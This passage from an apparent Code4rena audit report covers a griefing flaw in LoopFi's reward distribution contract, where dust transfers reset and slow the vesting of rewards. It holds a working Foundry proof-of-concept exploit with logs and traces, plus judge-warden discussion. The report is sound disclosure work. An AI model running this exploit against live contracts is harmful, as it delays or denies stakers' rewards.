```

If a small amount of `token` is sent directly to the contract this will mean that the unseen amount will also be very small but greater than 0. This will lead to the execution of:

```solidity
 r.rewardPerSecond = ((reward + leftover) * 1e12) / rewardsDuration;
```

`reward` will be the dust amount that was sent by the user. As a result, the following changes to the reward distribution will be made:

```solidity
else {
            uint256 remaining = r.periodFinish - block.timestamp;
            uint256 leftover = (remaining * r.rewardPerSecond) / 1e12;
            r.rewardPerSecond = ((reward + leftover) * 1e12) / rewardsDuration;
        }

        r.lastUpdateTime = block.timestamp;
        r.periodFinish = block.timestamp + rewardsDuration;
        r.balance = r.balance + reward;
```

Consider the following scenario:

1. Reward period starts at with `r.balance = 1000 eth` and `rewardsDuration = 10 days.` (For simplicity, the example will be in days not in seconds).
2. 9 days have passed and a user calls `getReward` so the accumulated reward from the vesting will be 900 eth. However a malicious user decides to send a small reward directly to the protocol. For example, 1 wei and they call get reward again:
    - `r.leftover = 100eth`
    - `r.rewardPerSecond = (100eth(leftover)+1wei) / 10 days(rewards duration) = 10 eth a day`
    - `r.period finish = now +10 days`

As you can see simply by directly sending a small amount, the `rewardPerSecond` was decreased drastically and the vest is now much longer.

### Recommended Mitigation Steps

`_notifyUnseenReward` should not be in functions without access control for trusted protocol roles, as griefing would always be possible. If you still want the unseen amount to be updated frequently consider value-weighted time additions to the vesting.

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/19#event-14338136543)**

**[Koolex (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/19#issuecomment-2371178083):**
 > Requesting a PoC (coded) to evaluate the risk based on real numbers. Only in PJ QA, please.

**[radin100 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/19#issuecomment-2391034211):**
 > I created two tests to show the attack once and multiple times. 
 >
 ><details>
 >
> ```solidity
> // SPDX-License-Identifier: UNLICENSED
> pragma solidity ^0.8.19;
> 
> import {TestBase, console} from "../TestBase.sol";
> import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
> import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
> import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
> import {ERC20Mock} from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
> import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
> 
> import {WAD} from "../../utils/Math.sol";
> import {IVaultRegistry} from "../../interfaces/IVaultRegistry.sol";
> import {MultiFeeDistribution} from "../../reward/MultiFeeDistribution.sol";
> import {IMultiFeeDistribution} from "../../reward/interfaces/IMultiFeeDistribution.sol";
> import {IPriceProvider} from "../../reward/interfaces/IPriceProvider.sol";
> import {IChefIncentivesController} from "../../reward/interfaces/IChefIncentivesController.sol";
> import {LockedBalance, Balances} from "../../reward/interfaces/LockedBalance.sol";
> import {Reward} from "../../reward/interfaces/LockedBalance.sol";
> 
> // chefIncentivesController.setEligibilityExempt(user, false);
> // chefIncentivesController.afterLockUpdate(user);
> contract MockController {
>     constructor() {}
>     function setEligibilityExempt(address user, bool info) external view {}
>     function afterLockUpdate(address user) external view {}
> }
> 
> contract MockPriceProvider {
>     constructor() {}
> 
>     function getRewardTokenPrice(address rewardToken, uint256 reward) external view returns (uint256) {
>         return 0;
>     }
>  function update() external view {}
> }
> 
> contract MultiFeeDistributionTest is TestBase {
>     using SafeERC20 for IERC20;
> 
>     MultiFeeDistribution internal multiFeeDistribution;
>     ERC20Mock public loopToken;
>     ERC20Mock public stakeToken;
>     ERC20Mock public rewardToken;
>     MockPriceProvider public m;
>     MockController public controller1;
>     address internal mockPriceProvider;
>     address internal mockLockZap;
>     address internal mockDao;
> 
>     uint256 public rewardsDuration = 30 days;
>     uint256 public rewardsLookback = 1 days;
>     uint256 public lockDuration = 10 days;
>     uint256 public burnRatio = 50000; // 50%
>     uint256 public vestDuration = 30 days;
> 
>     function setUp() public virtual override {
>         super.setUp();
> 
>         mockLockZap = vm.addr(uint256(keccak256("lockZap")));
>         mockDao = vm.addr(uint256(keccak256("dao")));
>         m = new MockPriceProvider();
>         controller1 = new MockController();
>         mockPriceProvider = address(m);
>         loopToken = new ERC20Mock();
>         stakeToken = new ERC20Mock();
>         rewardToken = new ERC20Mock();
>         multiFeeDistribution = MultiFeeDistribution(
>             address(
>                 new ERC1967Proxy(
>                     address(new MultiFeeDistribution()),
>                     abi.encodeWithSelector(
>                         MultiFeeDistribution.initialize.selector,
>                         address(loopToken),
>                         mockLockZap,
>                         mockDao,
>                         mockPriceProvider,
>                         rewardsDuration,
>                         rewardsLookback,
>                         lockDuration,
>                         burnRatio,
>                         vestDuration
>                     )
>                 )
>             )
>         );
>     }
> 
>     function _addLockDurations() internal returns (uint256 len) {
>         len = 4;
>         uint256[] memory lockDurations = new uint256[](len);
>         uint256[] memory rewardMultipliers = new uint256[](len);
>         lockDurations[0] = 2592000;
>         lockDurations[1] = 7776000;
>         lockDurations[2] = 15552000;
>         lockDurations[3] = 31104000;
> 
>         rewardMultipliers[0] = 1;
>         rewardMultipliers[1] = 4;
>         rewardMultipliers[2] = 10;
>         rewardMultipliers[3] = 25;
> 
>         multiFeeDistribution.setLockTypeInfo(lockDurations, rewardMultipliers);
>     }
> 
>     function test_exploit_once() public {
>         uint256 amount = 10 ether;
>         address alice = vm.addr(uint256(keccak256("Alice")));
>         address bob = vm.addr(uint256(keccak256("Bob")));
>         address minter = vm.addr(uint256(keccak256("minter")));
>         address[] memory minters = new address[](1);
>         minters[0] = minter;
>         address[] memory rewards = new address[](1);
>         rewards[0] = address(rewardToken);
>         uint256 len = _addLockDurations();
>         uint256 typeIndex = 0;
> 
>         stakeToken.mint(alice, amount);
>         rewardToken.mint(minter, 100 ether); //the reward will be 100 ether
>         rewardToken.mint(bob, 0.1 ether); //bob will have a very small amount
>         multiFeeDistribution.setLPToken(address(stakeToken));
> 
>         address incentivesController = address(controller1);
>         address treasury = vm.addr(uint256(keccak256("treasury")));
>         multiFeeDistribution.setAddresses(IChefIncentivesController(incentivesController), treasury);
> 
>         vm.mockCall(
>             incentivesController,
>             abi.encodeWithSelector(IChefIncentivesController.afterLockUpdate.selector, alice),
>             abi.encode(true)
>         );
>         vm.prank(alice);
>         stakeToken.approve(address(multiFeeDistribution), amount);
>         vm.prank(alice);
>         multiFeeDistribution.stake(amount, alice, 1);
>         multiFeeDistribution.setMinters(minters);
>         vm.prank(minter);
>         multiFeeDistribution.addReward(address(rewardToken));
>         vm.prank(minter);
>         rewardToken.transfer(address(multiFeeDistribution), 100 ether);
> 
>         vm.warp(block.timestamp);
>         vm.prank(alice);
>         multiFeeDistribution.getReward(rewards);
>         vm.warp(block.timestamp + 20 days);
>         vm.prank(alice);
>         multiFeeDistribution.getReward(rewards);
>         uint256 balanceBefore = rewardToken.balanceOf(address(alice));
>         uint256 dailyTokens1 = rewardToken.balanceOf(address(alice)) / 20; // the amount that alice has devided by the 20 days
>         console.log("daily rewards under normal conditions");
>         console.log(dailyTokens1); //These are the tokens that alice gets per day - 3.33e18
> 
>         vm.prank(bob);
>         rewardToken.transfer(address(multiFeeDistribution), 1); //bob transfers the dust amount
>         vm.prank(bob);
>         multiFeeDistribution.getReward(rewards); //calls get reward to update the rate
>         vm.warp(block.timestamp + 1 days);
>         vm.prank(alice);
>         multiFeeDistribution.getReward(rewards);
>         uint256 dailyTokens2 = rewardToken.balanceOf(address(alice)) - balanceBefore;
>         balanceBefore = rewardToken.balanceOf(address(alice));
>         console.log("New daily token rewards:");
>         console.log(dailyTokens2); //1e18
> 
>         //at the end bob managed to make it 0.326912783616223995 per day and he can slow it down as much as he wants
>         //What is more is that alice will have to wait for another 30 days!
>         console.log("spent by bob on the attack NOT e18");
>         console.log(0.1 ether - rewardToken.balanceOf(address(bob))); //Bob spent 20(not 0.20e18)
>         console.log(
>             "Pending rewards that the user will get after another 30 days instead of two of nobody does the attack again:"
>         );
>         console.log(rewardToken.balanceOf(address(multiFeeDistribution))); //the assets that will be distributed for the next 30 days instead of two
>     }
> 
>     function test_exploit_multiple_times() public {
>         uint256 amount = 10 ether;
>         address alice = vm.addr(uint256(keccak256("Alice")));
>         address bob = vm.addr(uint256(keccak256("Bob")));
>         address minter = vm.addr(uint256(keccak256("minter")));
>         address[] memory minters = new address[](1);
>         minters[0] = minter;
>         address[] memory rewards = new address[](1);
>         rewards[0] = address(rewardToken);
>         uint256 len = _addLockDurations();
>         uint256 typeIndex = 0;
> 
>         stakeToken.mint(alice, amount);
>         rewardToken.mint(minter, 100 ether); //the reward will be 100 ether
>         rewardToken.mint(bob, 0.1 ether); //bob will have a very small amount
>         multiFeeDistribution.setLPToken(address(stakeToken));
> 
>         address incentivesController = address(controller1);
>         address treasury = vm.addr(uint256(keccak256("treasury")));
>         multiFeeDistribution.setAddresses(IChefIncentivesController(incentivesController), treasury);
> 
>         vm.mockCall(
>             incentivesController,
>             abi.encodeWithSelector(IChefIncentivesController.afterLockUpdate.selector, alice),
>             abi.encode(true)
>         );
>         vm.prank(alice);
>         stakeToken.approve(address(multiFeeDistribution), amount);
>         vm.prank(alice);
>         multiFeeDistribution.stake(amount, alice, 1);
>         multiFeeDistribution.setMinters(minters);
>         vm.prank(minter);
>         multiFeeDistribution.addReward(address(rewardToken));
>         vm.prank(minter);
>         rewardToken.transfer(address(multiFeeDistribution), 100 ether);
> 
>         vm.warp(block.timestamp);
>         vm.prank(alice);
>         multiFeeDistribution.getReward(rewards);
>         vm.warp(block.timestamp + 20 days);
>         vm.prank(alice);
>         multiFeeDistribution.getReward(rewards);
>         uint256 balanceBefore = rewardToken.balanceOf(address(alice));
>         uint256 dailyTokens1 = rewardToken.balanceOf(address(alice)) / 20; // the amount that alice has devided by the 20 days
>         console.log(dailyTokens1); //These are the tokens that alice gets per day - 3.33e18
> 
>         for (uint i = 0; i < 20; i++) {
>             vm.prank(bob);
>             rewardToken.transfer(address(multiFeeDistribution), 1); //bob transfers the dust amount
>             vm.prank(bob);
>             multiFeeDistribution.getReward(rewards); //calls get reward to update the rate
>             vm.warp(block.timestamp + 1 days);
>             vm.prank(alice);
>             multiFeeDistribution.getReward(rewards);
>             uint256 dailyTokens2 = rewardToken.balanceOf(address(alice)) - balanceBefore;
>             balanceBefore = rewardToken.balanceOf(address(alice));
>             console.log("New daily token rewards:");
>             console.log(dailyTokens2); //1e18
>             vm.warp(block.timestamp + 3 days); //waits another three days
>         }
>         //at the end bob managed to make it 0.326912783616223995 per day and he can slow it down however he wants
>         //What is more is that alice will have to wait for another 30 days!
>         console.log(0.1 ether - rewardToken.balanceOf(address(bob))); //Bob spent 20(not 0.20e18)
>     } // @IMPORTANT Performing the attack once instead of twenty times can result in decreasing the rate
>         //and the duration will be reset, starting from beginning again!
> }
> ```
>
></details>
>
> The output is the following:
> 
> Results after running the attack once:
> Logs:
> ```
>   daily rewards under normal conditions
>   3333333333333333333
>   New daily token rewards:
>   1111111111111111111
>   spent by bob on the attack NOT e18
>   1
>   Pending rewards that the user will get after another 30 days instead of two of nobody does the attack again:
>   32222222222222222224
> ```
> Results after running the attack 20 times:
> Logs:
>
><details>
>
> ```
>   3333333333333333333 - under normal conditions
>   New daily token rewards:
>   1111111111111111111
>   New daily token rewards:
>   4296296296296296296
>   New daily token rewards:
>   3723456790123456790
>   New daily token rewards:
>   3226995884773662551
>   New daily token rewards:
>   2796729766803840878
>   New daily token rewards:
>   2423832464563328760
>   New daily token rewards:
>   2100654802621551592
>   New daily token rewards:
>   1820567495605344713
>   New daily token rewards:
>   1577825162857965418
>   New daily token rewards:
>   1367448474476903363
>   New daily token rewards:
>   1185122011213316248
>   New daily token rewards:
>   1027105743051540748
>   New daily token rewards:
>   890158310644668648
>   New daily token rewards:
>   771470535892046162
>   New daily token rewards:
>   668607797773106673
>   New daily token rewards:
>   579460091403359117
>   New daily token rewards:
>   502198745882911235
>   New daily token rewards:
>   435238913098523070
>   New daily token rewards:
>   377207058018719994
>   New daily token rewards:
>   326912783616223995
>   20
> ```
>
></details>
>
> The attack can be performed by anyone and allows anyone to extend reward finish time indefinitely and causing loss of funds for the users. So I consider it to be a valid High under the following C4 rule: "3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals)."
> 
> It also does not require any specific external conditions and can be performed anytime. Also the problem is not the attack itself, as it will happen anytime the contract's balance has changed. This means that even if it is used "the right way" by the protocol team, they will mess up the whole distribution so basically the whole functionality as-is now is useless.

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/19#issuecomment-2405900102):**
 > @radin100 - I am getting EVM revert. Any special steps to produce the output above?
> 
> <details>
>
> ```sh
> Ran 1 test for src/test/unit/poc.t.sol:MultiFeeDistributionTest
> [FAIL. Reason: EvmError: Revert] test_exploit_multiple_times() (gas: 1019654)
> Traces:
>   [1019654] MultiFeeDistributionTest::test_exploit_multiple_times()
>     ├─ [0] VM::addr(<pk>) [staticcall]
>     │   └─ ← [Return] 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea
>     ├─ [0] VM::addr(<pk>) [staticcall]
>     │   └─ ← [Return] 0x4dBa461cA9342F4A6Cf942aBd7eacf8AE259108C
>     ├─ [0] VM::addr(<pk>) [staticcall]
>     │   └─ ← [Return] 0x030F6a4C5Baa7350405fA8122cF458070Abd1B59
>     ├─ [236649] ERC1967Proxy::setLockTypeInfo([2592000 [2.592e6], 7776000 [7.776e6], 15552000 [1.555e7], 31104000 [3.11e7]], [1, 4, 10, 25])
>     │   ├─ [231691] MultiFeeDistribution::setLockTypeInfo([2592000 [2.592e6], 7776000 [7.776e6], 15552000 [1.555e7], 31104000 [3.11e7]], [1, 4, 10, 25]) [delegatecall]
>     │   │   ├─ emit LockTypeInfoUpdated(lockPeriod: [2592000 [2.592e6], 7776000 [7.776e6], 15552000 [1.555e7], 31104000 [3.11e7]], rewardMultipliers: [1, 4, 10, 25])
>     │   │   └─ ← [Stop] 
>     │   └─ ← [Return] 
>     ├─ [46638] ERC20Mock::mint(0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea, 10000000000000000000 [1e19])
>     │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea, value: 10000000000000000000 [1e19])
>     │   └─ ← [Stop] 
>     ├─ [46638] ERC20Mock::mint(0x030F6a4C5Baa7350405fA8122cF458070Abd1B59, 100000000000000000000 [1e20])
>     │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x030F6a4C5Baa7350405fA8122cF458070Abd1B59, value: 100000000000000000000 [1e20])
>     │   └─ ← [Stop] 
>     ├─ [24738] ERC20Mock::mint(0x4dBa461cA9342F4A6Cf942aBd7eacf8AE259108C, 100000000000000000 [1e17])
>     │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x4dBa461cA9342F4A6Cf942aBd7eacf8AE259108C, value: 100000000000000000 [1e17])
>     │   └─ ← [Stop] 
>     ├─ [24426] ERC1967Proxy::setLPToken(ERC20Mock: [0xd01212B1b66Aa0Cfc46dE9FcA030867bAec6efC4])
>     │   ├─ [24031] MultiFeeDistribution::setLPToken(ERC20Mock: [0xd01212B1b66Aa0Cfc46dE9FcA030867bAec6efC4]) [delegatecall]
>     │   │   ├─ emit LPTokenUpdated(_lpToken: ERC20Mock: [0xd01212B1b66Aa0Cfc46dE9FcA030867bAec6efC4])
>     │   │   └─ ← [Stop] 
>     │   └─ ← [Return] 
>     ├─ [0] VM::addr(<pk>) [staticcall]
>     │   └─ ← [Return] 0xf43Bca55E8091977223Fa5b776E23528D205dcA8
>     ├─ [46917] ERC1967Proxy::setAddresses(MockController: [0x3ba9aa3f215faDe4c84F457Ab3e5e64BE0FEFCB3], 0xf43Bca55E8091977223Fa5b776E23528D205dcA8)
>     │   ├─ [46519] MultiFeeDistribution::setAddresses(MockController: [0x3ba9aa3f215faDe4c84F457Ab3e5e64BE0FEFCB3], 0xf43Bca55E8091977223Fa5b776E23528D205dcA8) [delegatecall]
>     │   │   ├─ emit AddressesUpdated(_controller: MockController: [0x3ba9aa3f215faDe4c84F457Ab3e5e64BE0FEFCB3], _treasury: 0xf43Bca55E8091977223Fa5b776E23528D205dcA8)
>     │   │   └─ ← [Stop] 
>     │   └─ ← [Return] 
>     ├─ [0] VM::mockCall(MockController: [0x3ba9aa3f215faDe4c84F457Ab3e5e64BE0FEFCB3], 0x3adcdfc8000000000000000000000000bf0b5a4099f0bf6c8bc4252ebec548bae95602ea, 0x0000000000000000000000000000000000000000000000000000000000000001)
>     │   └─ ← [Return] 
>     ├─ [0] VM::prank(0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea)
>     │   └─ ← [Return] 
>     ├─ [24629] ERC20Mock::approve(ERC1967Proxy: [0x27C56392715dCe87635e39F239653dC985b0Dd11], 10000000000000000000 [1e19])
>     │   ├─ emit Approval(owner: 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea, spender: ERC1967Proxy: [0x27C56392715dCe87635e39F239653dC985b0Dd11], value: 10000000000000000000 [1e19])
>     │   └─ ← [Return] true
>     ├─ [0] VM::prank(0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea)
>     │   └─ ← [Return] 
>     ├─ [285670] ERC1967Proxy::stake(10000000000000000000 [1e19], 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea, 1)
>     │   ├─ [285266] MultiFeeDistribution::stake(10000000000000000000 [1e19], 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea, 1) [delegatecall]
>     │   │   ├─ emit LockerAdded(locker: 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea)
>     │   │   ├─ [27756] ERC20Mock::transferFrom(0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea, ERC1967Proxy: [0x27C56392715dCe87635e39F239653dC985b0Dd11], 10000000000000000000 [1e19])
>     │   │   │   ├─ emit Approval(owner: 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea, spender: ERC1967Proxy: [0x27C56392715dCe87635e39F239653dC985b0Dd11], value: 0)
>     │   │   │   ├─ emit Transfer(from: 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea, to: ERC1967Proxy: [0x27C56392715dCe87635e39F239653dC985b0Dd11], value: 10000000000000000000 [1e19])
>     │   │   │   └─ ← [Return] true
>     │   │   ├─ [0] MockController::afterLockUpdate(0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea)
>     │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
>     │   │   ├─ emit Locked(user: 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea, amount: 10000000000000000000 [1e19], lockedBalance: 10000000000000000000 [1e19], lockLength: 7776000 [7.776e6], isLP: true)
>     │   │   └─ ← [Stop] 
>     │   └─ ← [Return] 
>     ├─ [46084] ERC1967Proxy::setMinters([0x030F6a4C5Baa7350405fA8122cF458070Abd1B59])
>     │   ├─ [45680] MultiFeeDistribution::setMinters([0x030F6a4C5Baa7350405fA8122cF458070Abd1B59]) [delegatecall]
>     │   │   └─ ← [Stop] 
>     │   └─ ← [Return] 
>     ├─ [0] VM::prank(0x030F6a4C5Baa7350405fA8122cF458070Abd1B59)
>     │   └─ ← [Return] 
>     ├─ [93983] ERC1967Proxy::addReward(ERC20Mock: [0x3C786eec72204b391Fc3B339CEf2E84351999Ea6])
>     │   ├─ [93588] MultiFeeDistribution::addReward(ERC20Mock: [0x3C786eec72204b391Fc3B339CEf2E84351999Ea6]) [delegatecall]
>     │   │   ├─ emit RewardAdded(_rewardToken: ERC20Mock: [0x3C786eec72204b391Fc3B339CEf2E84351999Ea6])
>     │   │   └─ ← [Stop] 
>     │   └─ ← [Return] 
>     ├─ [0] VM::prank(0x030F6a4C5Baa7350405fA8122cF458070Abd1B59)
>     │   └─ ← [Return] 
>     ├─ [25093] ERC20Mock::transfer(ERC1967Proxy: [0x27C56392715dCe87635e39F239653dC985b0Dd11], 100000000000000000000 [1e20])
>     │   ├─ emit Transfer(from: 0x030F6a4C5Baa7350405fA8122cF458070Abd1B59, to: ERC1967Proxy: [0x27C56392715dCe87635e39F239653dC985b0Dd11], value: 100000000000000000000 [1e20])
>     │   └─ ← [Return] true
>     ├─ [0] VM::warp(2592000 [2.592e6])
>     │   └─ ← [Return] 
>     ├─ [0] VM::prank(0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea)
>     │   └─ ← [Return] 
>     ├─ [84235] ERC1967Proxy::getReward([0x3C786eec72204b391Fc3B339CEf2E84351999Ea6])
>     │   ├─ [83830] MultiFeeDistribution::getReward([0x3C786eec72204b391Fc3B339CEf2E84351999Ea6]) [delegatecall]
>     │   │   ├─ [354] MockController::setEligibilityExempt(0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea, true)
>     │   │   │   └─ ← [Stop] 
>     │   │   ├─ [562] ERC20Mock::balanceOf(ERC1967Proxy: [0x27C56392715dCe87635e39F239653dC985b0Dd11]) [staticcall]
>     │   │   │   └─ ← [Return] 100000000000000000000 [1e20]
>     │   │   ├─ emit RevenueEarned(asset: ERC20Mock: [0x3C786eec72204b391Fc3B339CEf2E84351999Ea6], assetAmount: 100000000000000000000 [1e20])
>     │   │   ├─ [312] MockPriceProvider::getRewardTokenPrice(ERC20Mock: [0x3C786eec72204b391Fc3B339CEf2E84351999Ea6], 100000000000000000000 [1e20]) [staticcall]
>     │   │   │   └─ ← [Return] 0
>     │   │   ├─ emit NewTransferAdded(asset: ERC20Mock: [0x3C786eec72204b391Fc3B339CEf2E84351999Ea6], lpUsdValue: 0)
>     │   │   ├─ [354] MockController::setEligibilityExempt(0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea, false)
>     │   │   │   └─ ← [Stop] 
>     │   │   ├─ [0] MockController::afterLockUpdate(0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea)
>     │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
>     │   │   ├─ [104] MockPriceProvider::update()
>     │   │   │   └─ ← [Revert] EvmError: Revert
>     │   │   └─ ← [Revert] EvmError: Revert
>     │   └─ ← [Revert] EvmError: Revert
>     └─ ← [Revert] EvmError: Revert
> 
>
> Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 11.24ms (2.50ms CPU time)
> 
> Ran 1 test suite in 958.64ms (11.24ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
> 
> Failing tests:
> Encountered 1 failing test in src/test/unit/poc.t.sol:MultiFeeDistributionTest
> [FAIL. Reason: EvmError: Revert] test_exploit_multiple_times() (gas: 1019654)
> ```
>
></details>

**[radin100 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/19#issuecomment-2406484082):**
 > @Koolex - thank you for running my tests. It seems that I forgot to add the update function in one of the mock contracts (because I commented out the `IPriceProvider(_priceProvider).update();` in the original code). Now I fixed the test so it will not fail in the original code. Sorry for the inconvenience.
 >
 ><details>
 >
> ```solidity
> // SPDX-License-Identifier: UNLICENSED
> pragma solidity ^0.8.19;
> 
> import {TestBase, console} from "../TestBase.sol";
> import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
> import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
> import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
> import {ERC20Mock} from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
> import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
> 
> import {WAD} from "../../utils/Math.sol";
> import {IVaultRegistry} from "../../interfaces/IVaultRegistry.sol";
> import {MultiFeeDistribution} from "../../reward/MultiFeeDistribution.sol";
> import {IMultiFeeDistribution} from "../../reward/interfaces/IMultiFeeDistribution.sol";
> import {IPriceProvider} from "../../reward/interfaces/IPriceProvider.sol";
> import {IChefIncentivesController} from "../../reward/interfaces/IChefIncentivesController.sol";
> import {LockedBalance, Balances} from "../../reward/interfaces/LockedBalance.sol";
> import {Reward} from "../../reward/interfaces/LockedBalance.sol";
> 
> // chefIncentivesController.setEligibilityExempt(user, false);
> // chefIncentivesController.afterLockUpdate(user);
> contract MockController {
>     constructor() {}
>     function setEligibilityExempt(address user, bool info) external view {}
>     function afterLockUpdate(address user) external view {}
> }
> 
> contract MockPriceProvider {
>     constructor() {}
> 
>     function getRewardTokenPrice(address rewardToken, uint256 reward) external view returns (uint256) {
>         return 0;
>     }
> 
>     function update() external view {}
> }
> 
> contract MultiFeeDistributionTest is TestBase {
>     using SafeERC20 for IERC20;
> 
>     MultiFeeDistribution internal multiFeeDistribution;
>     ERC20Mock public loopToken;
>     ERC20Mock public stakeToken;
>     ERC20Mock public rewardToken;
>     MockPriceProvider public m;
>     MockController public controller1;
>     address internal mockPriceProvider;
>     address internal mockLockZap;
>     address internal mockDao;
> 
>     uint256 public rewardsDuration = 30 days;
>     uint256 public rewardsLookback = 1 days;
>     uint256 public lockDuration = 10 days;
>     uint256 public burnRatio = 50000; // 50%
>     uint256 public vestDuration = 30 days;
> 
>     function setUp() public virtual override {
>         super.setUp();
> 
>         mockLockZap = vm.addr(uint256(keccak256("lockZap")));
>         mockDao = vm.addr(uint256(keccak256("dao")));
>         m = new MockPriceProvider();
>         controller1 = new MockController();
>         mockPriceProvider = address(m);
>         loopToken = new ERC20Mock();
>         stakeToken = new ERC20Mock();
>         rewardToken = new ERC20Mock();
>         multiFeeDistribution = MultiFeeDistribution(
>             address(
>                 new ERC1967Proxy(
>                     address(new MultiFeeDistribution()),
>                     abi.encodeWithSelector(
>                         MultiFeeDistribution.initialize.selector,
>                         address(loopToken),
>                         mockLockZap,
>                         mockDao,
>                         mockPriceProvider,
>                         rewardsDuration,
>                         rewardsLookback,
>                         lockDuration,
>                         burnRatio,
>                         vestDuration
>                     )
>                 )
>             )
>         );
>     }
> 
>     function _addLockDurations() internal returns (uint256 len) {
>         len = 4;
>         uint256[] memory lockDurations = new uint256[](len);
>         uint256[] memory rewardMultipliers = new uint256[](len);
>         lockDurations[0] = 2592000;
>         lockDurations[1] = 7776000;
>         lockDurations[2] = 15552000;
>         lockDurations[3] = 31104000;
> 
>         rewardMultipliers[0] = 1;
>         rewardMultipliers[1] = 4;
>         rewardMultipliers[2] = 10;
>         rewardMultipliers[3] = 25;
> 
>         multiFeeDistribution.setLockTypeInfo(lockDurations, rewardMultipliers);
>     }
> 
>     function test_exploit_once() public {
>         uint256 amount = 10 ether;
>         address alice = vm.addr(uint256(keccak256("Alice")));
>         address bob = vm.addr(uint256(keccak256("Bob")));
>         address minter = vm.addr(uint256(keccak256("minter")));
>         address[] memory minters = new address[](1);
>         minters[0] = minter;
>         address[] memory rewards = new address[](1);
>         rewards[0] = address(rewardToken);
>         uint256 len = _addLockDurations();
>         uint256 typeIndex = 0;
> 
>         stakeToken.mint(alice, amount);
>         rewardToken.mint(minter, 100 ether); //the reward will be 100 ether
>         rewardToken.mint(bob, 0.1 ether); //bob will have a very small amount
>         multiFeeDistribution.setLPToken(address(stakeToken));
> 
>         address incentivesController = address(controller1);
>         address treasury = vm.addr(uint256(keccak256("treasury")));
>         multiFeeDistribution.setAddresses(IChefIncentivesController(incentivesController), treasury);
> 
>         vm.mockCall(
>             incentivesController,
>             abi.encodeWithSelector(IChefIncentivesController.afterLockUpdate.selector, alice),
>             abi.encode(true)
>         );
>         vm.prank(alice);
>         stakeToken.approve(address(multiFeeDistribution), amount);
>         vm.prank(alice);
>         multiFeeDistribution.stake(amount, alice, 1);
>         multiFeeDistribution.setMinters(minters);
>         vm.prank(minter);
>         multiFeeDistribution.addReward(address(rewardToken));
>         vm.prank(minter);
>         rewardToken.transfer(address(multiFeeDistribution), 100 ether);
> 
>         vm.warp(block.timestamp);
>         vm.prank(alice);
>         multiFeeDistribution.getReward(rewards);
>         vm.warp(block.timestamp + 20 days);
>         vm.prank(alice);
>         multiFeeDistribution.getReward(rewards);
>         uint256 balanceBefore = rewardToken.balanceOf(address(alice));
>         uint256 dailyTokens1 = rewardToken.balanceOf(address(alice)) / 20; // the amount that alice has devided by the 20 days
>         console.log("daily rewards under normal conditions");
>         console.log(dailyTokens1); //These are the tokens that alice gets per day - 3.33e18
> 
>         vm.prank(bob);
>         rewardToken.transfer(address(multiFeeDistribution), 1); //bob transfers the dust amount
>         vm.prank(bob);
>         multiFeeDistribution.getReward(rewards); //calls get reward to update the rate
>         vm.warp(block.timestamp + 1 days);
>         vm.prank(alice);
>         multiFeeDistribution.getReward(rewards);
>         uint256 dailyTokens2 = rewardToken.balanceOf(address(alice)) - balanceBefore;
>         balanceBefore = rewardToken.balanceOf(address(alice));
>         console.log("New daily token rewards:");
>         console.log(dailyTokens2); //1e18
> 
>         //at the end bob managed to make it 0.326912783616223995 per day and he can slow it down as much as he wants
>         //What is more is that alice will have to wait for another 30 days!
>         console.log("spent by bob on the attack NOT e18");
>         console.log(0.1 ether - rewardToken.balanceOf(address(bob))); //Bob spent 20(not 0.20e18)
>         console.log(
>             "Pending rewards that the user will get after another 30 days instead of two of nobody does the attack again:"
>         );
>         console.log(rewardToken.balanceOf(address(multiFeeDistribution))); //the assets that will be distributed for the next 30 days instead of two
>     }
> 
>     function test_exploit_multiple_times() public {
>         uint256 amount = 10 ether;
>         address alice = vm.addr(uint256(keccak256("Alice")));
>         address bob = vm.addr(uint256(keccak256("Bob")));
>         address minter = vm.addr(uint256(keccak256("minter")));
>         address[] memory minters = new address[](1);
>         minters[0] = minter;
>         address[] memory rewards = new address[](1);
>         rewards[0] = address(rewardToken);
